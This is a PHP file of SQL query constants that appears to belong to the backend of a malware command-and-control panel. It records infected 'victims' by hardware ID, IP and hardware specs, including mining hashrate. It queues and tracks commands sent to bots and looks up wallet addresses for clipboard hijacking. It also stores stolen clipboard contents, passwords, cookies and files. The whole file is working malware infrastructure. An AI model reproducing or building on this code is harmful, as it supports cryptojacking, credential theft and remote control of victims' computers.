<?php

const SQL_INSERT_USER = 'INSERT INTO victims ( `hwid`, `ip`, `country`, `os`, `cpu`, `gpu`, `aw`, `privileges`, `hashrate`, `profile`,`install_date`, `last_response`,`latlng`,`ram`,`drives`) VALUES (:hwid,:ip,:country,:os,:cpu,:gpu,:aw,:priv,:hashrate,:profile,:install_date,:last_response,:latlng,:ram,:drives)';

const SQL_CHECK_USER = 'SELECT count(id) FROM victims WHERE `hwid` = ? LIMIT 1';

const SQL_UPDATE_USER = 'UPDATE victims SET `ip`= :ip,`country`= :country,`os`= :os,`cpu`= :cpu,`gpu`= :gpu,`aw`= :aw,`privileges`= :priv,`hashrate`= :hashrate,`last_response`= :last_response , `latlng` = :latlng , `ram` = :ram , `drives` = :drives WHERE `hwid`= :hwid';

const SQL_DISPLAY_COMMAND = 'SELECT id,type,args FROM `commands` WHERE id NOT IN (SELECT `command` FROM `commands_done` WHERE `hwid` = :hwid) AND (`country` = :country OR `country` = "all") AND (`profile` = :profile OR `profile` = "all") AND `count` > (SELECT COUNT(*) FROM `commands_done` WHERE `command` = id)';

const SQL_SUBMIT_COMMAND = 'INSERT INTO `commands_done`(`hwid`, `command`) VALUES (?,?)';

const SQL_DISPLAY_WALLET = 'SELECT wallet from wallets WHERE `name` = ? LIMIT 1';

const SQL_INSERT_CLIP = 'INSERT INTO `clips`(`hwid`, `ip`, `type`, `text`, `country`,`date`) VALUES (:hwid,:ip,:type,:text,:country,:date)';

const SQL_CHECK_LOG = 'SELECT count(*) FROM logs WHERE `hwid` = ? LIMIT 1';

const SQL_INSERT_LOG = 'INSERT INTO `logs`(`hwid`, `ip`, `country`, `pass`, `cookies`, `files`) VALUES (:hwid,:ip,:country,:pass,:cookies,:files)';



?>
